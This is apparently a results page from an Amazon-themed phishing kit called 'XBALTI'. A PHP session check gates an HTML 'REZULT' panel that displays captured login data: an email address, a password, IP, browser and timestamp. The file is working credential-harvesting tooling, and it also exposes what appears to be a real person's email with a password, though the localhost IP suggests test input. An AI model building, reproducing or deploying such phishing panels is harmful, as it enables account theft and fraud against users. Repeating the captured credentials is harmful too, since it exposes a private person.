<?php

session_start();
include('../amazon/XBALTI/Email.php');
 if ($_SESSION['passadmin'] == $_SESSION['ps']){
      }
else{
    header("location: index.php?ta_mlk_azebi_mbawe9");
    }
?>
<!DOCTYPE html>
<html>
<head>
	<title>*REZULT*</title>
</head>
<body    style=' padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:fixed;
    		border-bottom:1px solid rgba(255,255,255,0);
    		color: #ff8100;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #ff8100;'  >
	<p style='text-align: center;margin:40px 0;'  >
		<img height='100px;' src='http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Amazon-icon.png'>
	</p>
	<div   style=' margin:0 auto;
			max-width: 900px;
			width: 100%;
			border:2px solid #ff8100;
			border-radius: 4px;
			box-shadow: 0 0 20px #ff8100; '>


		<div align='center' style=' padding:10px 20px;  '>
          <h1 style='text-align: center;' >XBALTI</h1>
			<p style='text-align: center;'>LOGIN INFORMATION FROM || ip = ::1   </p>
			<p>
				<table  style='margin:40px 0;border-bottom: 4px solid #6b5c5c;padding: 20px 0;border-radius: 4px;border-top: 4px solid #6b5c5c;'  >
					<tr>
						<td style=' width: 30%;'>
							|Email|
						</td>
						<td>: 
							 kidamikky8@gmail.com
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Password|
						</td>
						<td>:
						jcjcjcjcj
						</td>
					</tr>
					<hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' />

					<tr>
						<td style=' width: 30%;'>
							|Country|
						</td>
						<td>: 
						
						</td>
					</tr>
                    
                    
					<tr>
						<td style=' width: 30%;'>
							|ip|
						</td>
						<td>: 
						::1
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|Browser/System|
						</td>
						<td>: 
						Chrome On Windows 7
						</td>
                      </tr>
					<tr>
						<td style=' width: 30%;'>
							|Time / Date|
						</td>
						<td>: 
						23:00:07 09/10/2018
						</td>
                      </tr>
				</table>
                <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
			</p>
		</div>
	</div>
</body>
</html>
